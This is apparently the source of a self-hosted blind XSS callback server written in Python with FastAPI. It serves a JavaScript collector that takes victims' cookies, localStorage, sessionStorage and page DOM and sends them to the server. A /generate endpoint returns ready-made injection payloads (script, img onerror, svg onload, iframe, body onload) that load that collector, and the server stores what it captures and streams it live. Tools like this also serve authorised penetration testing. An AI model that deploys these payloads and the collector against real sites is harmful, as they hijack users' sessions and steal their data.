"""
Blind XSS Callback Receiver

Self-hosted callback server for blind XSS detection.
Captures cookies, DOM, localStorage, and other data from triggered payloads.
"""

import os
import json
import hashlib
from datetime import datetime
from typing import Optional, List
from pathlib import Path

from fastapi import FastAPI, Request, WebSocket, WebSocketDisconnect
from fastapi.responses import Response
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel

CALLBACK_HOST = os.environ.get("CALLBACK_HOST", "0.0.0.0")
CALLBACK_PORT = int(os.environ.get("CALLBACK_PORT", "8004"))
CALLBACK_DIR = os.environ.get("CALLBACK_DIR", "/tmp/xss_callbacks")
NEO4J_URI = os.environ.get("NEO4J_URI", "")
NEO4J_USER = os.environ.get("NEO4J_USER", "neo4j")
NEO4J_PASSWORD = os.environ.get("NEO4J_PASSWORD", "")

app = FastAPI(title="Blind XSS Callback Receiver")

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

Path(CALLBACK_DIR).mkdir(parents=True, exist_ok=True)

websocket_clients: List[WebSocket] = []


class CallbackData(BaseModel):
    url: str
    cookies: Optional[str] = None
    dom: Optional[str] = None
    localStorage: Optional[str] = None
    sessionStorage: Optional[str] = None
    referrer: Optional[str] = None
    userAgent: Optional[str] = None
    screenshot: Optional[str] = None


def generate_callback_id() -> str:
    timestamp = datetime.now().isoformat()
    return hashlib.md5(timestamp.encode()).hexdigest()[:12]


async def broadcast_callback(data: dict):
    for client in websocket_clients:
        try:
            await client.send_json(data)
        except Exception:
            pass


def save_callback(callback_id: str, data: dict):
    filepath = Path(CALLBACK_DIR) / f"{callback_id}.json"
    with open(filepath, "w") as f:
        json.dump(data, f, indent=2)


async def store_in_neo4j(data: dict):
    if not NEO4J_URI:
        return

    try:
        from neo4j import AsyncGraphDatabase
        driver = AsyncGraphDatabase.driver(
            NEO4J_URI,
            auth=(NEO4J_USER, NEO4J_PASSWORD)
        )
        async with driver.session() as session:
            query = """
            CREATE (x:XSSCallback {
                callback_id: $callback_id,
                url: $url,
                cookies: $cookies,
                timestamp: $timestamp,
                source_ip: $source_ip,
                user_agent: $user_agent
            })
            """
            await session.run(query, **data)
        await driver.close()
    except Exception:
        pass


COLLECTOR_SCRIPT = """
(function() {
    var data = {
        url: window.location.href,
        cookies: document.cookie,
        localStorage: JSON.stringify(localStorage),
        sessionStorage: JSON.stringify(sessionStorage),
        referrer: document.referrer,
        userAgent: navigator.userAgent,
        dom: document.documentElement.outerHTML.substring(0, 5000)
    };

    var img = new Image();
    img.src = '{{CALLBACK_URL}}/collect?' +
        'url=' + encodeURIComponent(data.url) +
        '&cookies=' + encodeURIComponent(data.cookies) +
        '&referrer=' + encodeURIComponent(data.referrer) +
        '&userAgent=' + encodeURIComponent(data.userAgent);

    fetch('{{CALLBACK_URL}}/api/callback', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify(data),
        mode: 'no-cors'
    }).catch(function(){});
})();
"""


@app.get("/")
async def index():
    return {"status": "Blind XSS Callback Server", "endpoints": ["/collect", "/api/callback", "/callbacks", "/payload/{id}"]}


@app.get("/collect")
async def collect_get(request: Request):
    """Collect data via GET request (image beacon fallback)"""
    callback_id = generate_callback_id()

    data = {
        "callback_id": callback_id,
        "timestamp": datetime.now().isoformat(),
        "source_ip": request.client.host if request.client else "unknown",
        "method": "GET",
        "url": request.query_params.get("url", ""),
        "cookies": request.query_params.get("cookies", ""),
        "referrer": request.query_params.get("referrer", ""),
        "user_agent": request.query_params.get("userAgent", request.headers.get("user-agent", "")),
    }

    save_callback(callback_id, data)
    await broadcast_callback(data)
    await store_in_neo4j(data)

    gif_1x1 = b'GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;'
    return Response(content=gif_1x1, media_type="image/gif")


@app.post("/api/callback")
async def collect_post(request: Request):
    """Collect data via POST request (full data)"""
    callback_id = generate_callback_id()

    try:
        body = await request.json()
    except Exception:
        body = {}

    data = {
        "callback_id": callback_id,
        "timestamp": datetime.now().isoformat(),
        "source_ip": request.client.host if request.client else "unknown",
        "method": "POST",
        "url": body.get("url", ""),
        "cookies": body.get("cookies", ""),
        "localStorage": body.get("localStorage", ""),
        "sessionStorage": body.get("sessionStorage", ""),
        "dom": body.get("dom", ""),
        "referrer": body.get("referrer", ""),
        "user_agent": body.get("userAgent", request.headers.get("user-agent", "")),
    }

    save_callback(callback_id, data)
    await broadcast_callback(data)
    await store_in_neo4j(data)

    return {"status": "received", "callback_id": callback_id}


@app.get("/callbacks")
async def list_callbacks():
    """List all received callbacks"""
    callbacks = []
    callback_dir = Path(CALLBACK_DIR)

    for filepath in sorted(callback_dir.glob("*.json"), reverse=True):
        try:
            with open(filepath) as f:
                data = json.load(f)
                callbacks.append({
                    "callback_id": data.get("callback_id"),
                    "timestamp": data.get("timestamp"),
                    "url": data.get("url"),
                    "source_ip": data.get("source_ip"),
                    "has_cookies": bool(data.get("cookies")),
                })
        except Exception:
            pass

    return {"count": len(callbacks), "callbacks": callbacks[:100]}


@app.get("/callbacks/{callback_id}")
async def get_callback(callback_id: str):
    """Get details of a specific callback"""
    filepath = Path(CALLBACK_DIR) / f"{callback_id}.json"
    if not filepath.exists():
        return {"error": "Callback not found"}

    with open(filepath) as f:
        return json.load(f)


@app.get("/payload/{callback_id}")
async def get_payload(callback_id: str, request: Request):
    """Get JavaScript payload with embedded callback URL"""
    host = request.headers.get("host", f"{CALLBACK_HOST}:{CALLBACK_PORT}")
    scheme = request.headers.get("x-forwarded-proto", "http")
    callback_url = f"{scheme}://{host}"

    script = COLLECTOR_SCRIPT.replace("{{CALLBACK_URL}}", callback_url)
    return Response(content=script, media_type="application/javascript")


@app.get("/payload.js")
async def get_generic_payload(request: Request):
    """Get generic collector payload"""
    host = request.headers.get("host", f"{CALLBACK_HOST}:{CALLBACK_PORT}")
    scheme = request.headers.get("x-forwarded-proto", "http")
    callback_url = f"{scheme}://{host}"

    script = COLLECTOR_SCRIPT.replace("{{CALLBACK_URL}}", callback_url)
    return Response(content=script, media_type="application/javascript")


@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    """WebSocket for real-time callback notifications"""
    await websocket.accept()
    websocket_clients.append(websocket)
    try:
        while True:
            await websocket.receive_text()
    except WebSocketDisconnect:
        websocket_clients.remove(websocket)


@app.get("/generate")
async def generate_payloads(request: Request):
    """Generate ready-to-use blind XSS payloads"""
    host = request.headers.get("host", f"{CALLBACK_HOST}:{CALLBACK_PORT}")
    scheme = request.headers.get("x-forwarded-proto", "http")
    callback_url = f"{scheme}://{host}"

    payloads = {
        "script_src": f'"><script src={callback_url}/payload.js></script>',
        "img_onerror": f'"><img src=x onerror="var s=document.createElement(\'script\');s.src=\'{callback_url}/payload.js\';document.body.appendChild(s);">',
        "svg_onload": f'"><svg onload="var s=document.createElement(\'script\');s.src=\'{callback_url}/payload.js\';document.body.appendChild(s);">',
        "iframe": f'"><iframe src="javascript:var s=document.createElement(\'script\');s.src=\'{callback_url}/payload.js\';document.body.appendChild(s);">',
        "body_onload": f'"><body onload="var s=document.createElement(\'script\');s.src=\'{callback_url}/payload.js\';document.body.appendChild(s);">',
    }

    return {"callback_url": callback_url, "payloads": payloads}


if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host=CALLBACK_HOST, port=CALLBACK_PORT)
